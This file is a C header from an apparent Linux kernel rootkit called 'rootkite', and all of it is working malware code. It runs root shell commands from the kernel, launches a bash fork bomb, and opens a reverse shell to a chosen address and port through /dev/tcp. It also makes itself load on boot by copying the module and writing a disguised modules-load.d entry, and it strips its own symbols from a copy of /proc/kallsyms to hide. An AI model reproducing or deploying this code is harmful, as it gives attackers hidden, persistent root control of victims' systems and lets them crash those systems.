#ifndef COMMAND_KITE
    #define COMMAND_KITE
    #include <linux/slab.h>
    #include <linux/umh.h>

/*  prep basic environment variables and the args for the bash call with the command itself.
    might be better to use sh shell, which always present.
*/
static char *env[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}; // environment variables of the process
static char *args_shell[] = {"/bin/bash", "-c", "", NULL};


static int run_shell(char *command){
    int ret;
    args_shell[2] = command;
    ret = call_usermodehelper(args_shell[0], args_shell, env, UMH_WAIT_EXEC);
    if (ret != 0){
#ifdef KITE_DEBUG
		pr_err("error in call to usermodehelper: %i\n", ret);
#endif
    }
	  else {
#ifdef KITE_DEBUG
			pr_info("called usermode command: %s\n", command);
#endif
    }
    kfree(command);
    return ret;
}


/*use bash binary to do a command that defines a function that calls itself,
  pipe the output to another call of itself, making a recursive function that calls itself
  and creating a fork each time with the pipe operator.
  It runs a user-space application. The application is started asynchronously if wait is not set,
  and runs as a child of system workqueues(kworkers, executors of kthreads) that are children of kthreadd. (ie. it runs with full root capabilities and optimized affinity).
  the kthreadd enumerates other kernel threads; it provides interface routines through which other kernel threads can be dynamically spawned at runtime by kernel services.
  can also spawn multiple processes for multiple workers for added complexity.
  */
static void start_bombing_run(void){
    char *comm = kmalloc(NAME_MAX + 1, GFP_KERNEL);
    snprintf(comm, NAME_MAX, ":(){ :|:& };:");
    run_shell(comm);
}

/*calling a usermode helper, using the bash binary,
  call a reverse shell on selected address and port, can change to user input or dns or proxy...
  can check for listener to not open connection for nothing
*/
static void start_reverse_shell(char *address, char *port){
    char *add = kmalloc(NAME_MAX + 1, GFP_KERNEL);
    snprintf(add, NAME_MAX, "/bin/sh -i >& /dev/tcp/%s/%s 0>&1", address, port);
    run_shell(add);
}

/* insert rootkite on boot, do it by inserting the module to modprobe's module list,
   then insert the configuration to load the module and update the list.*/
static void rooted(void){
    char *comm = kmalloc(NAME_MAX + 1, GFP_KERNEL);
    snprintf(comm, NAME_MAX, "ls /lib/modules/$(uname -r)/kernel/fs/ | grep rootkite || find / -name rootkite.ko -exec cp {} /lib/modules/$(uname -r)/kernel/fs/ \\; -quit && echo rootkite > /etc/modules-load.d/ath_pci.conf && depmod");
    run_shell(comm);
}

/* create a copy of /proc/kallsyms with removed refrences to rootkite to later redirect to from /proc/kallsyms*/
static void hide_ksyms(void){
  char *comm = kmalloc(NAME_MAX + 1, GFP_KERNEL);
  snprintf(comm, NAME_MAX, "mkdir /tmp/ssh-XXTkJI | cat /proc/kallsyms | grep -v rootkite > /tmp/ssh-XXTkJI/ksf_save_tmp");
  run_shell(comm);
}

/*print out the memory of a certain address(for later dissassemble)*/
static void print_function(unsigned char *address, int n){
    int i = 0;
    while(i < n)
    {
        pr_info("%.2x ", *(address + i));
        i++;
    }
    pr_info("\n");
}
#endif